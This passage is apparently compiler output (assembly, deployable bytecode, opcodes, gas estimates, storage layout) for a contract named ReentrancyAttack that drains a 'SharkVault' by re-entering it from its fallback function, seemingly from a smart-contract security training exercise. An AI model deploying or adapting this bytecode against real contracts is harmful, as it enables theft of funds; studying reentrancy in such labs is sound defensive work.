tag_106\n        /* \"#utility.yul\":3069:3072   */\n      dup3\n        /* \"#utility.yul\":2980:3073   */\n      tag_64\n      jump\t// in\n    tag_106:\n        /* \"#utility.yul\":3098:3100   */\n      0x20\n        /* \"#utility.yul\":3093:3096   */\n      dup3\n        /* \"#utility.yul\":3089:3101   */\n      add\n        /* \"#utility.yul\":3082:3101   */\n      swap1\n      pop\n        /* \"#utility.yul\":2741:3107   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3113:3532   */\n    tag_35:\n        /* \"#utility.yul\":3279:3283   */\n      0x00\n        /* \"#utility.yul\":3317:3319   */\n      0x20\n        /* \"#utility.yul\":3306:3315   */\n      dup3\n        /* \"#utility.yul\":3302:3320   */\n      add\n        /* \"#utility.yul\":3294:3320   */\n      swap1\n      pop\n        /* \"#utility.yul\":3366:3375   */\n      dup2\n        /* \"#utility.yul\":3360:3364   */\n      dup2\n        /* \"#utility.yul\":3356:3376   */\n      sub\n        /* \"#utility.yul\":3352:3353   */\n      0x00\n        /* \"#utility.yul\":3341:3350   */\n      dup4\n        /* \"#utility.yul\":3337:3354   */\n      add\n        /* \"#utility.yul\":3330:3377   */\n      mstore\n        /* \"#utility.yul\":3394:3525   */\n      tag_108\n        /* \"#utility.yul\":3520:3524   */\n      dup2\n        /* \"#utility.yul\":3394:3525   */\n      tag_65\n      jump\t// in\n    tag_108:\n        /* \"#utility.yul\":3386:3525   */\n      swap1\n      pop\n        /* \"#utility.yul\":3113:3532   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3538:3719   */\n    tag_66:\n        /* \"#utility.yul\":3678:3711   */\n      0x4e656564206174206c65617374203120657468657220746f2061747461636b00\n        /* \"#utility.yul\":3674:3675   */\n      0x00\n        /* \"#utility.yul\":3666:3672   */\n      dup3\n        /* \"#utility.yul\":3662:3676   */\n      add\n        /* \"#utility.yul\":3655:3712   */\n      mstore\n        /* \"#utility.yul\":3538:3719   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3725:4091   */\n    tag_67:\n        /* \"#utility.yul\":3867:3870   */\n      0x00\n        /* \"#utility.yul\":3888:3955   */\n      tag_111\n        /* \"#utility.yul\":3952:3954   */\n      0x1f\n        /* \"#utility.yul\":3947:3950   */\n      dup4\n        /* \"#utility.yul\":3888:3955   */\n      tag_63\n      jump\t// in\n    tag_111:\n        /* \"#utility.yul\":3881:3955   */\n      swap2\n      pop\n        /* \"#utility.yul\":3964:4057   */\n      tag_112\n        /* \"#utility.yul\":4053:4056   */\n      dup3\n        /* \"#utility.yul\":3964:4057   */\n      tag_66\n      jump\t// in\n    tag_112:\n        /* \"#utility.yul\":4082:4084   */\n      0x20\n        /* \"#utility.yul\":4077:4080   */\n      dup3\n        /* \"#utility.yul\":4073:4085   */\n      add\n        /* \"#utility.yul\":4066:4085   */\n      swap1\n      pop\n        /* \"#utility.yul\":3725:4091   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4097:4516   */\n    tag_41:\n        /* \"#utility.yul\":4263:4267   */\n      0x00\n        /* \"#utility.yul\":4301:4303   */\n      0x20\n        /* \"#utility.yul\":4290:4299   */\n      dup3\n        /* \"#utility.yul\":4286:4304   */\n      add\n        /* \"#utility.yul\":4278:4304   */\n      swap1\n      pop\n        /* \"#utility.yul\":4350:4359   */\n      dup2\n        /* \"#utility.yul\":4344:4348   */\n      dup2\n        /* \"#utility.yul\":4340:4360   */\n      sub\n        /* \"#utility.yul\":4336:4337   */\n      0x00\n        /* \"#utility.yul\":4325:4334   */\n      dup4\n        /* \"#utility.yul\":4321:4338   */\n      add\n        /* \"#utility.yul\":4314:4361   */\n      mstore\n        /* \"#utility.yul\":4378:4509   */\n      tag_114\n        /* \"#utility.yul\":4504:4508   */\n      dup2\n        /* \"#utility.yul\":4378:4509   */\n      tag_67\n      jump\t// in\n    tag_114:\n        /* \"#utility.yul\":4370:4509   */\n      swap1\n      pop\n        /* \"#utility.yul\":4097:4516   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4522:4607   */\n    tag_68:\n        /* \"#utility.yul\":4567:4574   */\n      0x00\n        /* \"#utility.yul\":4596:4601   */\n      dup2\n        /* \"#utility.yul\":4585:4601   */\n      swap1\n      pop\n        /* \"#utility.yul\":4522:4607   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4613:4771   */\n    tag_69:\n        /* \"#utility.yul\":4671:4680   */\n      0x00\n        /* \"#utility.yul\":4704:4765   */\n      tag_117\n        /* \"#utility.yul\":4722:4764   */\n      tag_118\n        /* \"#utility.yul\":4731:4763   */\n      tag_119\n        /* \"#utility.yul\":4757:4762   */\n      dup5\n        /* \"#utility.yul\":4731:4763   */\n      tag_68\n      jump\t// in\n    tag_119:\n        /* \"#utility.yul\":4722:4764   */\n      tag_53\n      jump\t// in\n    tag_118:\n        /* \"#utility.yul\":4704:4765   */\n      tag_52\n      jump\t// in\n    tag_117:\n        /* \"#utility.yul\":4691:4765   */\n      swap1\n      pop\n        /* \"#utility.yul\":4613:4771   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4777:4924   */\n    tag_70:\n        /* \"#utility.yul\":4872:4917   */\n      tag_121\n        /* \"#utility.yul\":4911:4916   */\n      dup2\n        /* \"#utility.yul\":4872:4917   */\n      tag_69\n      jump\t// in\n    tag_121:\n        /* \"#utility.yul\":4867:4870   */\n      dup3\n        /* \"#utility.yul\":4860:4918   */\n      mstore\n        /* \"#utility.yul\":4777:4924   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4930:5168   */\n    tag_43:\n        /* \"#utility.yul\":5031:5035   */\n      0x00\n        /* \"#utility.yul\":5069:5071   */\n      0x20\n        /* \"#utility.yul\":5058:5067   */\n      dup3\n        /* \"#utility.yul\":5054:5072   */\n      add\n        /* \"#utility.yul\":5046:5072   */\n      swap1\n      pop\n        /* \"#utility.yul\":5082:5161   */\n      tag_123\n        /* \"#utility.yul\":5158:5159   */\n      0x00\n        /* \"#utility.yul\":5147:5156   */\n      dup4\n        /* \"#utility.yul\":5143:5160   */\n      add\n        /* \"#utility.yul\":5134:5140   */\n      dup5\n        /* \"#utility.yul\":5082:5161   */\n      tag_70\n      jump\t// in\n    tag_123:\n        /* \"#utility.yul\":4930:5168   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212204f88fc999710d368931129ad66ea34cc52c9f4b40bec86abbcbe71c57fda15c264736f6c63430008180033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f80fd5b5060405161082538038061082583398181016040528101906100319190610125565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503360015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610150565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e3826100ba565b9050919050565b5f6100f4826100d9565b9050919050565b610104816100ea565b811461010e575f80fd5b50565b5f8151905061011f816100fb565b92915050565b5f6020828403121561013a576101396100b6565b5b5f61014784828501610111565b91505092915050565b6106c88061015d5f395ff3fe608060405260043610610042575f3560e01c80633ccfd60b1461011e5780637b26ad79146101345780638da5cb5b1461015e5780639e5faafc1461018857610049565b3661004957005b670de0b6b3a76400005f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061011c575f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639835e092670de0b6b3a76400006040518263ffffffff1660e01b81526004016100ee9190610484565b5f604051808303815f87803b158015610105575f80fd5b505af1158015610117573d5f803e3d5ffd5b505050505b005b348015610129575f80fd5b50610132610192565b005b34801561013f575f80fd5b50610148610288565b604051610155919061050e565b60405180910390f35b348015610169575f80fd5b506101726102ab565b60405161017f9190610547565b60405180910390f35b6101906102d0565b005b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610221576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610218906105ba565b60405180910390fd5b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f19350505050158015610285573d5f803e3d5ffd5b50565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a764000034101561031b576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161031290610622565b60405180910390fd5b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663465a7007670de0b6b3a76400005f6040518363ffffffff1660e01b815260040161037c9190610679565b5f604051808303818588803b158015610393575f80fd5b505af11580156103a5573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639835e092670de0b6b3a76400006040518263ffffffff1660e01b815260040161040a9190610484565b5f604051808303815f87803b158015610421575f80fd5b505af1158015610433573d5f803e3d5ffd5b50505050565b5f819050919050565b5f819050919050565b5f819050919050565b5f61046e61046961046484610439565b61044b565b610442565b9050919050565b61047e81610454565b82525050565b5f6020820190506104975f830184610475565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6104d66104d16104cc8461049d565b61044b565b61049d565b9050919050565b5f6104e7826104bc565b9050919050565b5f6104f8826104dd565b9050919050565b610508816104ee565b82525050565b5f6020820190506105215f8301846104ff565b92915050565b5f6105318261049d565b9050919050565b61054181610527565b82525050565b5f60208201905061055a5f830184610538565b92915050565b5f82825260208201905092915050565b7f4f6e6c79206f776e65722063616e2077697468647261770000000000000000005f82015250565b5f6105a4601783610560565b91506105af82610570565b602082019050919050565b5f6020820190508181035f8301526105d181610598565b9050919050565b7f4e656564206174206c65617374203120657468657220746f2061747461636b005f82015250565b5f61060c601f83610560565b9150610617826105d8565b602082019050919050565b5f6020820190508181035f83015261063981610600565b9050919050565b5f819050919050565b5f61066361065e61065984610640565b61044b565b610442565b9050919050565b61067381610649565b82525050565b5f60208201905061068c5f83018461066a565b9291505056fea26469706673582212204f88fc999710d368931129ad66ea34cc52c9f4b40bec86abbcbe71c57fda15c264736f6c63430008180033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x825 CODESIZE SUB DUP1 PUSH2 0x825 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0x125 JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x150 JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xE3 DUP3 PUSH2 0xBA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xF4 DUP3 PUSH2 0xD9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x104 DUP2 PUSH2 0xEA JUMP JUMPDEST DUP2 EQ PUSH2 0x10E JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x11F DUP2 PUSH2 0xFB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x13A JUMPI PUSH2 0x139 PUSH2 0xB6 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x147 DUP5 DUP3 DUP6 ADD PUSH2 0x111 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x6C8 DUP1 PUSH2 0x15D PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x42 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x3CCFD60B EQ PUSH2 0x11E JUMPI DUP1 PUSH4 0x7B26AD79 EQ PUSH2 0x134 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x15E JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x188 JUMPI PUSH2 0x49 JUMP JUMPDEST CALLDATASIZE PUSH2 0x49 JUMPI STOP JUMPDEST PUSH8 0xDE0B6B3A7640000 PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x11C JUMPI PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x9835E092 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xEE SWAP2 SWAP1 PUSH2 0x484 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x105 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x117 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x129 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x132 PUSH2 0x192 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x13F JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x148 PUSH2 0x288 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x155 SWAP2 SWAP1 PUSH2 0x50E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x169 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x172 PUSH2 0x2AB JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x17F SWAP2 SWAP1 PUSH2 0x547 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x190 PUSH2 0x2D0 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x221 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x218 SWAP1 PUSH2 0x5BA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x285 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x31B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x312 SWAP1 PUSH2 0x622 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x465A7007 PUSH8 0xDE0B6B3A7640000 PUSH0 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x37C SWAP2 SWAP1 PUSH2 0x679 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x393 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3A5 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x9835E092 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x40A SWAP2 SWAP1 PUSH2 0x484 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x421 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x433 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x46E PUSH2 0x469 PUSH2 0x464 DUP5 PUSH2 0x439 JUMP JUMPDEST PUSH2 0x44B JUMP JUMPDEST PUSH2 0x442 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x47E DUP2 PUSH2 0x454 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x497 PUSH0 DUP4 ADD DUP5 PUSH2 0x475 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x4D6 PUSH2 0x4D1 PUSH2 0x4CC DUP5 PUSH2 0x49D JUMP JUMPDEST PUSH2 0x44B JUMP JUMPDEST PUSH2 0x49D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x4E7 DUP3 PUSH2 0x4BC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x4F8 DUP3 PUSH2 0x4DD JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x508 DUP2 PUSH2 0x4EE JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x521 PUSH0 DUP4 ADD DUP5 PUSH2 0x4FF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x531 DUP3 PUSH2 0x49D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x541 DUP2 PUSH2 0x527 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x55A PUSH0 DUP4 ADD DUP5 PUSH2 0x538 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4F6E6C79206F776E65722063616E207769746864726177000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x5A4 PUSH1 0x17 DUP4 PUSH2 0x560 JUMP JUMPDEST SWAP2 POP PUSH2 0x5AF DUP3 PUSH2 0x570 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x5D1 DUP2 PUSH2 0x598 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E656564206174206C65617374203120657468657220746F2061747461636B00 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x60C PUSH1 0x1F DUP4 PUSH2 0x560 JUMP JUMPDEST SWAP2 POP PUSH2 0x617 DUP3 PUSH2 0x5D8 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x639 DUP2 PUSH2 0x600 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x663 PUSH2 0x65E PUSH2 0x659 DUP5 PUSH2 0x640 JUMP JUMPDEST PUSH2 0x44B JUMP JUMPDEST PUSH2 0x442 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x673 DUP2 PUSH2 0x649 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x68C PUSH0 DUP4 ADD DUP5 PUSH2 0x66A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x4F DUP9 0xFC SWAP10 SWAP8 LT 0xD3 PUSH9 0x931129AD66EA34CC52 0xC9 DELEGATECALL 0xB4 SIGNEXTEND 0xEC DUP7 0xAB 0xBC 0xBE PUSH18 0xC57FDA15C264736F6C634300081800330000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "347200",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"": "infinite",
						"attack()": "infinite",
						"owner()": "2530",
						"sharkVault()": "infinite",
						"withdraw()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"owner()": "8da5cb5b",
					"sharkVault()": "7b26ad79",
					"withdraw()": "3ccfd60b"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 87,
						"contract": "Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol:ReentrancyAttack",
						"label": "sharkVault",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(SharkVault)504"
					},
					{
						"astId": 89,
						"contract": "Node-Guardian_Cream_Rkt/Src/Contracts/ReentrancyAttack.sol:ReentrancyAttack",
						"label": "owner",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_contract(SharkVault)504": {
						"encoding": "inplace",
						"label": "contract SharkVault",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}